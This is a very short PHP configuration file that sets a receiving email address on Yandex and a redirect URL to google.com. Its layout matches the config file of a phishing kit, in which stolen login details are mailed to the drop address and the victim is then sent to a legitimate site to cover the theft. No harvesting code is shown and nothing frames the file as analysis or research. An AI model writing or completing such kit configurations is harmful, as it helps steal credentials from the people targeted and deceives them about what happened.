<?php 
$Receive_email="realestysn01@yandex.com";
$redirect="https://www.google.com/";
?>